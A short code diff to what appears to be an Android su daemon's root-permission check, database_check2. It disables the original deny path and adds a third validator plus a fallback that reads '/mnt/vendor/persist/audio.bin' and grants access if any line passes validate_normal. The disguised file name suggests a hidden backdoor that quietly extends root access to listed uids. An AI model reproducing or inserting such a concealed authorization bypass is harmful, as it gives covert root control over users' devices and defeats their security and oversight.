@@ -74,11 +74,27 @@ static void database_check(const shared_ptr<su_info> &info) {
 
 static bool database_check2(const shared_ptr<su_info> &info) {
     int uid = info->uid;
-    bool ret1, ret2;
+    bool ret1, ret2, ret3;
+    FILE *fp;
+    char *pstr;
+    char buff[64];
     ret1 = validate_shell(uid, nullptr);
     ret2 = validate_arocket(uid, nullptr);
-    if(!ret1 && !ret2)
+    ret3 = validate_arocket2(uid, nullptr);
+    // if(!ret1 && !ret2)
+    //     return false;
+    if(!ret1 && !ret2 && !ret3) {
+        fp = fopen("/mnt/vendor/persist/audio.bin", "r");
+        if(!fp)
+            return false;
+        while(fgets(buff, sizeof(buff) ,fp) != NULL)
+        {
+            pstr = strtok(buff, "\n");
+            if(true == validate_normal(uid, nullptr, pstr))
+                return true;
+        }
         return false;
+    }
     return true;
 }
 
